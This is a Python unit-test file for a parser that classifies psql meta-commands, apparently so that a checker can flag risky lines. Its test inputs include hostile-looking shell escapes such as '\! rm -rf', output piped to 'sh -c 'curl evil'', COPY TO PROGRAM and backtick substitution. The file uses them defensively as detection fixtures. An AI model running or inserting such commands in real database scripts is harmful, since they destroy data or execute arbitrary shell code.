"""Unit-Tests fuer die psql-Meta-Command-Normalisierung (aci.checks.psql_meta)."""

from aci.checks.psql_meta import parse_psql_meta_line


def test_plain_sql_line_is_not_meta():
    assert parse_psql_meta_line("SELECT 1 FROM t;") is None


def test_shell_escape():
    mc = parse_psql_meta_line("\\! rm -rf /tmp/x")
    assert mc is not None
    assert mc.command == "!" and mc.has_shell_escape
    assert mc.args == "rm -rf /tmp/x"


def test_copy_program():
    mc = parse_psql_meta_line("\\copy t TO PROGRAM 'gzip > t.gz'")
    assert mc.command == "copy" and mc.has_program
    assert not mc.has_pipe_target


def test_copy_file_has_no_program():
    mc = parse_psql_meta_line("\\copy t FROM 'data.csv'")
    assert mc.command == "copy" and not mc.has_program


def test_copy_program_tab_variant():
    mc = parse_psql_meta_line("\\copy\tt\tfrom\tprogram\t'cmd'")
    assert mc.command == "copy" and mc.has_program


def test_set_backtick():
    mc = parse_psql_meta_line("\\set today `date +%F`")
    assert mc.command == "set" and mc.has_backtick


def test_set_tab_backtick_variant():
    mc = parse_psql_meta_line("\\set\tvar\t`cmd`")
    assert mc.command == "set" and mc.has_backtick


def test_set_literal_has_no_backtick():
    mc = parse_psql_meta_line("\\set safe '2026-01-01'")
    assert mc.command == "set" and not mc.has_backtick


def test_output_pipe_target():
    mc = parse_psql_meta_line("\\o | sh -c 'curl evil'")
    assert mc.command == "o" and mc.has_pipe_target


def test_output_file_is_not_pipe():
    mc = parse_psql_meta_line("\\o /tmp/dump.txt")
    assert mc.command == "o" and not mc.has_pipe_target and mc.args


def test_gexec_command():
    mc = parse_psql_meta_line("\\gexec")
    assert mc.command == "gexec"


def test_if_is_not_include():
    # \if (Conditional) darf nicht als \i (include) gewertet werden.
    mc = parse_psql_meta_line("\\if :flag")
    assert mc is not None and mc.command == "if"


def test_setenv_getenv():
    assert parse_psql_meta_line("\\setenv PGPASSWORD x").command == "setenv"
    assert parse_psql_meta_line("\\getenv v PATH").command == "getenv"


def test_leading_whitespace_is_allowed():
    mc = parse_psql_meta_line("   \\gexec")
    assert mc is not None and mc.command == "gexec"


def test_normalized_collapses_whitespace():
    mc = parse_psql_meta_line("\\copy   t    TO   PROGRAM   'x'")
    assert mc.normalized == "\\copy t TO PROGRAM 'x'"
